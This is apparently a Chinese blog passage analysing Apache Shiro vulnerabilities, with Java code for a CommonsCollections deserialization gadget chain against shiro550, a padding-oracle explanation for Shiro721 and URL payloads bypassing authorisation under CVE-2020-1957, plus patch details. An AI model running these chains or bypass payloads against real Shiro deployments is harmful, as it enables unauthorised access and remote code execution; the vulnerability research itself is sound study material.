+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502195627032.png" alt="image-20230502195627032"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502195618090.png" alt="image-20230502195618090"></p>
+<h4 id="CC链打shiro550"><a href="#CC链打shiro550" class="headerlink" title="CC链打shiro550"></a>CC链打shiro550</h4><p>虽然已经有了CB无依赖打shiro550这条链，但是还是写一下关于CC链打shiro的链子吧</p>
+<p>先把cc依赖放进去</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502200817704.png" alt="image-20230502200817704"></p>
+<p>然后我们先随便找个对应的cc链打一下</p>
+<p>可以发现计算器没弹出来，然后在shiro的控制台里可以看见有这种报错</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502201211712.png" alt="image-20230502201211712"></p>
+<p>一个是Transformer类没加载出来，另一个是不能对字节数组反序列化</p>
+<p>这个问题具体的原因可以看这个<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1dq4y1B76x/?spm_id_from=333.788&vd_source=053f03b424a45370bc5813843ae5268f">Shiro反序列化漏洞(二)-shiro下的CC链利用</a>，是tomcat的类加载器的问题</p>
+<p>简单的原因是Shiro 使用 <code>ClassResolvingObjectInputStream</code> 执行反序列化的操作，这个类重写了 <code>resolveClass</code> ，实际使用 <code>ClassLoader.loadClass()</code> 方式而非 ObjectInputStream 中的 <code>Class.forName()</code> 的方式。而 <code>forName</code> 的方式可以加载任意的数组类型，<code>loadClass</code> 只能加载原生的类型的 Object Array。</p>
+<blockquote>
+<p>p牛的结论是 <strong>如果反序列化流中包含非 Java 自身的数组，则会出现无法加载类的错误</strong>。</p>
+</blockquote>
+<p>现在一般有两种解决方法</p>
+<ul>
+<li>使用 RMI 中的 Gadget 做跳板，再执行 CC 反序列化链，这样可以加载；</li>
+<li>改造 CC 链，组合 InvokerTransformer 与 TemplatesImpl，避免使用 Transformer 数组。</li>
+</ul>
+<p>rmi学的不是很精，还不太懂怎么利用rmi攻击，所以就先写写第二种</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1.png" alt="image-20230324142852121"></p>
+<p>首先看上边这个图，我们之所以要用Transformer数组类，最主要的问题就是通过transform执行runtime.exec的时候我们需要控制输入，也就必须用transform数组。所以这里我们选用加载恶意字节码文件的方式</p>
+<p>然后由于不能有transform数组类型，所以就不能用ConstantTransformer和InvokerTransformer形成链条的这种方式</p>
+<p>所以这里我们选用CC6的前半段加CC3的后半段</p>
+<pre class="language-java" data-language="java"><code class="language-java">public class cc &#123;
+    public static void main(String[] args) throws TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;
+        &#x2F;&#x2F;cc3
+        TemplatesImpl templates &#x3D; new TemplatesImpl();
+        &#x2F;&#x2F; _name赋值不为null
+        Field name &#x3D; templates.getClass().getDeclaredField(&quot;_name&quot;);
+            name.setAccessible(true);
+            name.set(templates,&quot;123&quot;);
+        &#x2F;&#x2F; _class赋值为null
+        Field classField &#x3D; templates.getClass().getDeclaredField(&quot;_class&quot;);
+            classField.setAccessible(true);
+            classField.set(templates,null);
+        &#x2F;&#x2F;加载恶意类的字节码
+        Field bytecodes &#x3D; templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);
+            bytecodes.setAccessible(true);
+        byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:&#x2F;&#x2F;ctftools&#x2F;ctfscript&#x2F;javastudy&#x2F;CC&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;cc3&#x2F;cmd.class&quot;));
+        &#x2F;&#x2F;转为二维数组
+        byte[][] codes &#x3D; &#123;code&#125;;
+            bytecodes.set(templates,codes);
+        InvokerTransformer newTransformer &#x3D; new InvokerTransformer(&quot;newTransformer&quot;, null, null);
+		&#x2F;&#x2F;cc6
+        HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;();
+
+        Map decorate &#x3D; LazyMap.decorate(objectObjectHashMap,new ConstantTransformer(&quot;1&quot;));
+
+        TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(decorate,templates);
+        HashMap&lt;Object, Object&gt; hashMap &#x3D; new HashMap&lt;&gt;();
+        hashMap.put(tiedMapEntry, &quot;123&quot;);
+
+        Class LazyMapClass &#x3D; LazyMap.class;
+        Field factory &#x3D; LazyMapClass.getDeclaredField(&quot;factory&quot;);
+        factory.setAccessible(true);
+        factory.set(decorate,newTransformer);
+        decorate.clear();
+        file.serialize(hashMap,&quot;ser.bin&quot;);
+        file.unserialize(&quot;ser.bin&quot;);
+    &#125;
+&#125;</code></pre>
+
+<p>调用链就是从hashmap到TiedMapEntry再到LazyMap，通过LazyMap触发TemplatesImpl的newTransformer，加载恶意字节码</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502214640694.png" alt="image-20230502214640694"></p>
+<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>升级shiro版本到1.2.5</p>
+<p>Shiro 在 1.2.5 的更新 <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848">Commit-4d5bb00</a> 中针对此漏洞进行了修复，描述为：Force RememberMe cipher to be set to survive JVM restart.If the property is not set, a new cipher will be generated.</p>
+<p>也就是说，应用程序需要用户手动配置一个 cipherKey，如果不设置，将会生成一个新 key。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641782550351.png" alt="img"></p>
+<h2 id="CVE-2016-6802"><a href="#CVE-2016-6802" class="headerlink" title="CVE-2016-6802"></a>CVE-2016-6802</h2><h3 id="漏洞信息-3"><a href="#漏洞信息-3" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table>
+<thead>
+<tr>
+<th align="left">漏洞信息</th>
+<th align="left">详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞编号</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6802">CVE-2016-6802</a> / <a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2016-07814">CNVD-2016-07814</a></td>
+</tr>
+<tr>
+<td align="left">影响版本</td>
+<td align="left">shiro &lt; 1.3.2</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
+<td align="left">Shiro 使用非根 servlet 上下文路径中存在安全漏洞。远程攻击者通过构造的请求， 利用此漏洞可绕过目标 servlet 过滤器并获取访问权限。</td>
+</tr>
+<tr>
+<td align="left">漏洞关键字</td>
+<td align="left">绕过 | Context Path | 非根 | /x/../</td>
+</tr>
+<tr>
+<td align="left">漏洞补丁</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/b15ab927709ca18ea4a02538be01919a19ab65af">Commit-b15ab92</a></td>
+</tr>
+<tr>
+<td align="left">相关链接</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/14055279.html">https://www.cnblogs.com/backlion/p/14055279.html</a></td>
+</tr>
+</tbody></table>
+<h3 id="漏洞详解-2"><a href="#漏洞详解-2" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><p>这个洞感觉也没啥好跟的，就是在获取路径的导致的绕过问题（我也不想配环境了</p>
+<p>在访问路径的前添加 /任意目录名/../，即可绕过认证权限进行访问</p>
+<p>Shiro通过调用 <code>WebUtils.getContextPath()</code> 方法，获取 <code>javax.servlet.include.context_path</code> 属性或调用 <code>request.getContextPath()</code> 获取 Context 值。</p>
+<p>由于获取的 Context Path 没有标准化处理，如果是非常规的路径，例如 CVE-2010-3863 中出现过的 <code>/./</code>，或者跳跃路径 <code>/su18/../</code>，都会导致在 <code>StringUtils.startsWithIgnoreCase()</code> 方法判断时失效，直接返回完整的 Request URI 。</p>
+<p>这样 Shiro 匹配不到配置路径，就会在某些配置下发生绕过</p>
+<h3 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>Shiro 在 1.3.2 版本的更新 <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/b15ab927709ca18ea4a02538be01919a19ab65af">Commit-b15ab92</a> 中针对此漏洞进行了修复。</p>
+<h2 id="CVE-2019-12422"><a href="#CVE-2019-12422" class="headerlink" title="CVE-2019-12422"></a>CVE-2019-12422</h2><h3 id="漏洞信息-4"><a href="#漏洞信息-4" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table>
+<thead>
+<tr>
+<th align="left">漏洞信息</th>
+<th align="left">详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞编号</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12422">CVE-2019-12422</a> / <a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2019-42574">CNVD-2016-07814</a> / <a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-721">SHIRO-721</a></td>
+</tr>
+<tr>
+<td align="left">影响版本</td>
+<td align="left">shiro &lt; 1.4.2 (1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1)</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
+<td align="left">RememberMe Cookie 默认通过 AES-128-CBC 模式加密，这种加密方式容易受到 Padding Oracle Attack 攻击，攻击者利用有效的 RememberMe Cookie 作为前缀， 然后精心构造 RememberMe Cookie 值来实现反序列化漏洞攻击。</td>
+</tr>
+<tr>
+<td align="left">漏洞关键字</td>
+<td align="left">反序列化 | RememberMe | Padding | CBC</td>
+</tr>
+<tr>
+<td align="left">漏洞补丁</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/a8018783373ff5e5210225069c9919e071597d5e">Commit-a801878</a></td>
+</tr>
+<tr>
+<td align="left">相关链接</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://blog.skullsecurity.org/2016/going-the-other-way-with-padding-oracles-encrypting-arbitrary-data">https://blog.skullsecurity.org/2016/12</a> <a target="_blank" rel="noopener" href="https://resources.infosecinstitute.com/topic/padding-oracle-attack-2/">https://resources.infosecinstitute.com/topic/padding-oracle-attack-2/</a> <a target="_blank" rel="noopener" href="https://codeantenna.com/a/OwWV5Ivtsi">https://codeantenna.com/a/OwWV5Ivtsi</a></td>
+</tr>
+</tbody></table>
+<p>Shiro721，也是一个Cookie的反序列化</p>
+<h3 id="漏洞详解-3"><a href="#漏洞详解-3" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><p>本次漏洞实际并不是针对 shiro 代码逻辑的漏洞，而是针对 shiro 使用的 AES-128-CBC 加密模式的攻击，首先了解一下这种加密方式。（一字不差搬过来的</p>
+<blockquote>
+<h4 id="AES-128-CBC"><a href="#AES-128-CBC" class="headerlink" title="AES-128-CBC"></a>AES-128-CBC</h4><p>AES 全称 Advanced Encryption Standard （高级加密标准），是一种为了取代其前任标准（DES）而成为新标准的对称分组加密算法。这里有几个关键字：</p>
+<ul>
+<li>对称：所谓对称加密，即使用同一组 key 进行明文和密文的转换。</li>
+<li>分组加密算法：将明文分成多个等长的模块（block），使用确定的算法和对称密钥对每组分别加密解密。常见的有 ECB、CBC、PCBC、CFB、OFB、CTR 等几种算法。</li>
+<li>分组长度固定为 128bit 。</li>
+<li>密钥 key 的长度可以为 128 bit（16字节）、192 bit（24字节）、256 bit（32字节）。根据密钥的长度不同，推荐加密轮数也不同，上述三个密钥长度分别迭代 10/12/14 轮。加密轮数越多，安全性越好，同时也更耗费时间。</li>
+</ul>
+<p>因此 AES-128-CBC 模式就代表使用 AES 密钥长度为 128 bit，使用 CBC 分组算法的加密模式。</p>
+<p>再来了解一下 CBC，全称 Cipher Block Chaining (密文分组链接模式)，简单来说，是一种使用前一个密文组与当前明文组 XOR 后再进行加密的模式。</p>
+<p>关于 AES 加解密流程实现可以看<a target="_blank" rel="noopener" href="https://codeantenna.com/a/OwWV5Ivtsi">这篇文章</a>，关于 CBC 分组的实现可以看<a target="_blank" rel="noopener" href="https://blog.csdn.net/chengqiuming/article/details/82288851">这篇文章</a>。这里就不占篇幅描述了。</p>
+<p>CBC 模式下，有三种填充方式，用于在分组数据不足时，在结尾进行填充，用于补齐：</p>
+<ul>
+<li>NoPadding：不填充，明文长度必须是 16 Bytes 的倍数。</li>
+<li>PKCS5Padding：以完整字节填充 , 每个填充字节的值是用于填充的字节数 。即要填充 N 个字节 , 每个字节都为 N。</li>
+<li>ISO10126Padding：以随机字节填充 , 最后一个字节为填充字节的个数。</li>
+</ul>
+<p>Shiro 中使用的是 PKCS5Padding，也就是说，可能出现的 padding byte 值只可能为：</p>
+<ul>
+<li>1 个字节的 padding 为 0x01</li>
+<li>2 个字节的 padding 为 0x02,0x02</li>
+<li>3 个字节的 padding 为 0x03,0x03,0x03</li>
+<li>4 个字节的 padding 为 0x04,0x04,0x04,0x04</li>
+<li>...</li>
+</ul>
+<p>当待加密的数据长度刚好满足分组长度的倍数时，仍然需要填充一个分组长度，也就是说，明文长度如果是 16n，加密后的数据长度为 16(n+1) 。</p>
+<h4 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h4><p>Padding Oracle Attack 就是针对 CBC 模式分组加密算法的一种攻击手段，可以查看<a target="_blank" rel="noopener" href="https://resources.infosecinstitute.com/topic/padding-oracle-attack-2/">这篇文章</a>学习，英文有困难的小伙伴可以查看<a target="_blank" rel="noopener" href="https://www.guildhab.top/2020/11/cve-2019-12422-shiro721-apache-shiro-rememberme-padding-oracle-1-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E5%88%86%E6%9E%90-%E4%B8%8A/">这篇文章</a>，说的非常清晰。</p>
+<p>这里还是简单的描述一下攻击思路，在加密时，最后一个分组如果长度不够，会进行填充，然后使用倒数第二个分组的密文作为 IV 进行异或，然后进行 AES 加密。</p>
+<p>在解密时，先对密文组（CiperText）使用密钥 (Key) 进行 AES 解密，得到一个中间值（MediumValue），然后再异或 IV (也就是上一个密文组) 就会得到这个分组的明文分组（PlainText）。</p>
+<p>这个明文分组，是经过 PKCS5Padding 规范填充过的，因此它一定是遵从 PKCS5Padding 的规范的，这个规范就是本次的攻击验证点。</p>
+<p>Padding Oracle Attack 就是利用了异或的魅力以及 PKCS5Padding 规范的可穷举性进行的攻击，wikipedia 中给出解释：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641986191136.png" alt="img"></p>
+<p>这个攻击逻辑我想了小一天，看了 fynch3r 师傅的博客，又咨询了下，最后想通了，这里用比较清晰的话描述出来，供跟我一样密码学和数学基础较差的朋友理解：</p>
+<ul>
+<li>攻击者修改倒数第二组密文的最后一个字节，发送到服务器，服务器解密后得到 MediumValue，将其与攻击者修改后的倒数第二组密文异或，得到 PlainText，然后对其进行 Padding 校验，此时校验大概率会失败，因为修改过的密文与 MediumValue 异或后不是原本的 Padding 了。</li>
+<li>此时攻击者遍历修改倒数第二组密文的最后一个字节 ( 0x00 - 0xFF , 最多遍历 255 次 )，使其与 MediumValue 异或，直到最后一个字节异或的结果是 0x01 ，这样得到的 PlainText 是符合 Padding 规范的，攻击者期待程序返回不一样的结果进行判断。这种情况下攻击者可以知道：MediumValue 异或攻击者遍历修改倒数第二组密文的结果的最后一个字节为 0x01 ，根据异或的运算法则，MediumValue 最后一个字节就是 0x01 异或攻击者修改的字节。此时攻击者得到了 <code>MediumValue[8]</code> 的值。此时攻击者知道了 <code>MediumValue[8]</code> 的值，还可以知道原倒数第二组密文最后一个字节的值，就可以计算出原 <code>PlainText[8]</code> 的值，</li>
+<li>接下来攻击者遍历修改倒数第二组密文的倒数第二个字节，此时攻击者希望异或运算后得到的明文分组的最后两个字节为 0x02 0x02，这样是符合 Padding 规范的，并且由于已经计算了出了 <code>PlainText[8]</code> 的值，因此在这轮遍历中可以用原倒数第二组密文最后一个字节的值异或<code>PlainText[8]</code>再异或 0x02 作为倒数第二组密文的最后一个字节，因为它与 <code>MediumValue[8]</code> 的异或一定为 0x02，攻击者依旧只需要遍历第二组密文的倒数第二个字节即可。</li>
+<li>依次类推，可以依次计算出最后一组密文中全部的 MediumValue 及 PlainText。</li>
+<li>舍弃掉最后一组密文，向服务器提交第一组至倒数第二组密文，迭代之前的操作，获得倒数第二组明文。依次规律，直到获得所有分组的明文。</li>
+</ul>
+<p>看了全网，发现这部分流程还是 Epicccal 师傅的相关<a target="_blank" rel="noopener" href="https://www.guildhab.top/2020/11/cve-2019-12422-shiro721-apache-shiro-rememberme-padding-oracle-1-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E5%88%86%E6%9E%90-%E4%B8%8A/">博客</a>写的最为清晰。</p>
+<p>至此，攻击者可以在不知道密钥 Key 的情况下得到全部明文的值。但这有两个前提：</p>
+<ol>
+<li>服务器会对解密结果进行 padding 校验，并且结果可以从响应中进行判断（类似 SQL 盲注）。</li>
+<li>攻击者已知能正确解密和使用的密文以及初始向量 IV。</li>
+</ol>
+<h3 id="CBC-Byte-Flipping-Attack"><a href="#CBC-Byte-Flipping-Attack" class="headerlink" title="CBC Byte-Flipping Attack"></a>CBC Byte-Flipping Attack</h3><p>到现在已经可以使用 Padding Oracle Attack 在不知道 key 的情况下获取全部明文的值，但这仅仅是信息泄露，能不能进一步篡改信息呢？这里就用到了 CBC 字节翻转攻击。</p>
+<p>相关原理可看<a target="_blank" rel="noopener" href="https://resources.infosecinstitute.com/topic/cbc-byte-flipping-attack-101-approach/">这篇文章</a>以及<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/163756.html">这篇文章</a>。这里还是简单描述：通过修改密文进而篡改明文。</p>
+<p>在解密时，会使用 MediumValue 与上一组密文进行异或来得到明文，现在知道上一组密文，也知道本组的明文，就能计算出本组的 MediumValue，如果想要异或出不一样的数据，我们只需要篡改上一组的密文，使其跟 MediumValue 能异或出指定的数据即可。</p>
+<p>这是一个逆推的过程：</p>
+<ul>
+<li>获取最后一组密文，由 Padding Oracle Attack 爆破出其 MediumValue ，根据篡改后的明文与 MediumValue 异或，得到前一轮的密文。</li>
+<li>再使用计算出来的前一轮的密文继续爆破出对应的 MediumValue，再根据篡改后的明文进行异或，再得到前一轮的密文。</li>
+<li>以此类推到第一组，异或出的值作为起始 IV。</li>
+</ul>
+<p>拼接起始 IV 以及全部计算出的每组的密文即可获得一个可以使服务器解密为指定明文数据的密文了。</p>
+</blockquote>
+<p>Padding Oracle Attack简单说就是通过PKCS5的给不满足长度的分组补后缀的方式来爆破出明文的内容</p>
+<p>比如我现在构造了个全是0x00的倒数第二组密文C2，那么倒数第一组密文C1再经过解密后变为一个我们不知道的KEY(C1)，此时若要最终解密完成，还要与C2进行异或操作，也就是C2^KEY(C1)。</p>
+<p>那么由于我现在可以控制C2，也就能控制最终得到的明文，而又由于明文遵循PKCS5的填充方式，因此我们可以通过爆破让C2的最后一个字符异或KEY(C1)的最后一个字符为0x01，那么此时C2^KEY(C1) = 0x01，我们就能算出KEY(C1)的最后一个字符，然后再让C2的后两个字符异或KEY(C1) 等于0x02，我们就能得到KEY(C1)的倒数第二个字符，以此类推得到整个KEY(C1)。</p>
+<p>那我们知道KEY(C1)异或一个真正的第二组密文得到的就是明文，那假如我们知道了真正的倒数第二组密文，就能得到最后一组密文所对应的明文</p>
+<p>所以Padding Oracle Attack的利用条件就是</p>
+<ul>
+<li>可以修改密文</li>
+<li>已知密文和iv</li>
+</ul>
+<p>CBC Byte-Flipping Attack简单来说，和Padding Oracle Attack原理差不多，唯一的差别是我们通过Padding Oracle Attack知道了KEY(C1)的值，那么我们就可以去构造恶意的C2，让最终系统解密出来的明文是我们想要的内容了</p>
+<p>shiro721就是利用这种方式，让我们在不知道加密密钥的情况下，通过修改RememberMe使其解密后的内容成为我们反序列化的payload。反序列化的链子和550是一样的。</p>
+<p>但是一个字节最多要爆破255次，一个分组有十六个字节，所以一个分组最多要爆破255 * 16 = 4080次，按照shiro550的payload长度，感觉最少要十几万次爆破。</p>
+<h3 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>在 1.4.2 版本的更新 <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/a8018783373ff5e5210225069c9919e071597d5e">Commit-a801878</a> 中针对此漏洞进行了修复 ，在父级类 JcaCipherService 中抽象出了一个 <code>createParameterSpec()</code> 方法返回加密算法对应的类。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641954457087.png" alt="img"></p>
+<p>并在 AesCipherService 中重写了这个方法，默认使用 GCM 加密模式，避免此类攻击。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641954465546.png" alt="img"></p>
+<h2 id="CVE-2020-1957"><a href="#CVE-2020-1957" class="headerlink" title="CVE-2020-1957"></a>CVE-2020-1957</h2><h3 id="漏洞信息-5"><a href="#漏洞信息-5" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table>
+<thead>
+<tr>
+<th align="left">漏洞信息</th>
+<th align="left">详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞编号</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1957">CVE-2020-1957</a> / <a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-20984">CNVD-2020-20984</a> / <a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-682">SHIRO-682</a></td>
+</tr>
+<tr>
+<td align="left">影响版本</td>
+<td align="left">shiro &lt; 1.5.2</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
+<td align="left">Spring Boot 中使用 Apache Shiro 进行身份验证、权限控制时，可以精心构造恶意的URL 利用 Shiro 和 SpringBoot 对 URL 的处理的差异化，可以绕过 Shiro 对 SpringBoot 中的 Servlet 的权限控制，越权并实现未授权访问。</td>
+</tr>
+<tr>
+<td align="left">漏洞关键字</td>
+<td align="left">SpringBoot | 差异化处理 | / | 绕过</td>
+</tr>
+<tr>
+<td align="left">漏洞补丁</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/589f10d40414a815dbcaf1f1500a51f41258ef70">Commit-589f10d</a> &amp;&amp; <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/9762f97926ba99ac0d958e088cae3be8b657948d">Commit-9762f97</a> &amp;&amp; <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce">Commit-3708d79</a></td>
+</tr>
+<tr>
+<td align="left">相关链接</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-742">SHIRO-742</a> <a target="_blank" rel="noopener" href="https://www.openwall.com/lists/oss-security/2020/03/23/2">https://www.openwall.com/lists/oss-security/2020/03/23/2</a> <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-2957">CVE-2020-2957</a> -&gt; ?</td>
+</tr>
+</tbody></table>
+<h3 id="漏洞详解-4"><a href="#漏洞详解-4" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><p>不想搭环境了，感觉路径解析的问题也没啥好分析源码的，所以就直接抄了（</p>
+<h4 id="SHIRO-682"><a href="#SHIRO-682" class="headerlink" title="SHIRO-682"></a>SHIRO-682</h4><p>本漏洞起源于 <a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-682">SHIRO-682</a>，Issues 描述了在 SpingWeb 中处理 requestURI 与 shiro 中匹配鉴权路径差异导致的绕过问题：在 Spring 中，<code>/resource/menus</code> 与 <code>/resource/menus/</code> 都可以访问资源，但是在 shiro 中，这两个路径是成功匹配的，所以在 Spring 集成 shiro 时，只需要在访问路径后添加 &quot;/&quot; 就存在绕过权限校验的可能。</p>
+<p>其实就是 spring 在分发请求时，会从 <code>DispatcherServlet#handlerMappings</code> 找到能匹配路径的 Handler，会遍历匹配路径，负责匹配的 <code>PathPattern#match</code> 方法对 &quot;/admin/list/&quot; 和 &quot;/admin/list&quot; 的匹配会返回 true。</p>
+<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p>除了上面的漏洞，本 CVE 通报版本号内还存在一个另一个绕过。利用的是 shiro 和 spring 对 url 中的 &quot;;&quot; 处理的差别来绕过校验。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642082062877.png" alt="img"></p>
+<p>然，绕过的原理就是访问 <code>/aaaadawdadaws;/..;wdadwadadw/;awdwadwa/audit/list</code> 这个请求的时候会被 shiro 和 spring 解析成不同的结果。</p>
+<p>先来看下 shiro，之前提到过，shiro 会用自己处理过的 RequestURI 和配置的路径进行匹配，具体的方法就是 <code>WebUtils#getRequestUri</code>，方法先调用 <code>decodeAndCleanUriString</code> 方法处理请求路径，再调用 normalize 方法标准化路径。<code>decodeAndCleanUriString</code> 方法逻辑如下，可以看到，对 URL 中存在 &quot;;&quot; 的处理是直接截断后面的内容。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642077803111.png" alt="img"></p>
+<p>那 Spring 是怎么处理的呢？方法是 <code>UrlPathHelper#decodeAndCleanUriString</code> ，方法名也叫 <code>decodeAndCleanUriString</code>，你说巧不巧？其实一点也不巧，这分明就是 shiro 抄 spring 的作业。</p>
+<p>方法里一次执行了 3 个动作：removeSemicolonContent 移除分号，decodeRequestString 解码，getSanitizedPath 清理路径，具体描述如下图：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642083274083.png" alt="img"></p>
+<p>其中出现差异的点就在于 <code>UrlPathHelper#removeSemicolonContent</code> ，逻辑如下图：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642077812198.png" alt="img"></p>
+<p>可以看到，spring 处理了每个 / / 之间的分号，均把 &quot;;&quot; 及之后的内容截取掉了。所以当请求 <code>/aaaadawdadaws;/..;wdadwadadw/;awdwadwa/audit/list</code> 进入到 <code>UrlPathHelper#decodeAndCleanUriString</code> 方法时，会逐渐被处理：</p>
+<ul>
+<li>removeSemicolonContent：&quot;/aaaadawdadaws/..//audit/list&quot;</li>
+<li>decodeRequestString：&quot;/aaaadawdadaws/..//audit/list&quot;</li>
+<li>getSanitizedPath：&quot;/aaaadawdadaws/../audit/list&quot;</li>
+</ul>
+<p>这样再标准化就会成为正常的 &quot;/audit/list&quot;。</p>
+<p>这种思路是哪里来的呢？其实又是抄了 Tomcat 的处理思想，处理逻辑位于 <code>org.apache.catalina.connector.CoyoteAdapter#parsePathParameters</code> 如下图</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642087561486.png" alt="img"></p>
+<p>也就说，在 Tomcat 的实现下，对于访问 URL 为 &quot;/aaaadawdadaws;/..;wdadwadadw/;awdwadwa/audit/list&quot; 的请求，使用 <code>request.getServletPath()</code> 就会返回 &quot;/audit/list&quot;。</p>
+<p>而由于 spring 内嵌 tomcat ，又在处理时借鉴了它的思路，所以导致 <code>UrlPathHelper#getPathWithinServletMapping</code> 方法其实无论如何都会返回经过上述处理逻辑过后的路径，也就是 &quot;/audit/list&quot;。</p>
+<p>了解了这个处理机制后，这个路径就可以被花里胡哨的改为：</p>
+<pre class="language-txt" data-language="txt"><code class="language-txt">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;123;&#x2F;..;345&#x2F;;..&#x2F;.;&#x2F;su18&#x2F;..;&#x2F;;&#x2F;;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;;&#x2F;;&#x2F;;awdwadwa&#x2F;audit&#x2F;list</code></pre>
+
+<p>依然可以绕过校验：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642088051819.png" alt="img"></p>
+<p>经测试，上面这个 payload 只能在较低版本的 Spring Boot 上使用。为什么呢？直接引用<br>Ruil1n 师傅的<a target="_blank" rel="noopener" href="http://rui0.cn/archives/1643">原文</a>:</p>
+<blockquote>
+<p>当 Spring Boot 版本在小于等于 2.3.0.RELEASE 的情况下，alwaysUseFullPath 为默认值 false，这会使得其获取 ServletPath ，所以在路由匹配时相当于会进行路径标准化包括对 %2e 解码以及处理跨目录，这可能导致身份验证绕过。而反过来由于高版本将 alwaysUseFullPath 自动配置成了 true 从而开启全路径，又可能导致一些安全问题。</p>
+</blockquote>
+<p>针对这方面的内容，截止至本文发出前，先知上有师傅发出了<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10799">tomcat容器url解析特性研究</a>，对其中的相关内容进行了详述，可移步观看。</p>
+<p>在高版本上不处理跨目录，就只能借助 shiro 一些配置问题尝试绕过：比如应用程序配置了访问路径 &quot;/audit/**&quot; 为 anon，但是指定了其中的一个 &quot;/audit/list&quot; 为 authc。这时在不跳目录的情况下，可以使用如下请求绕过：</p>
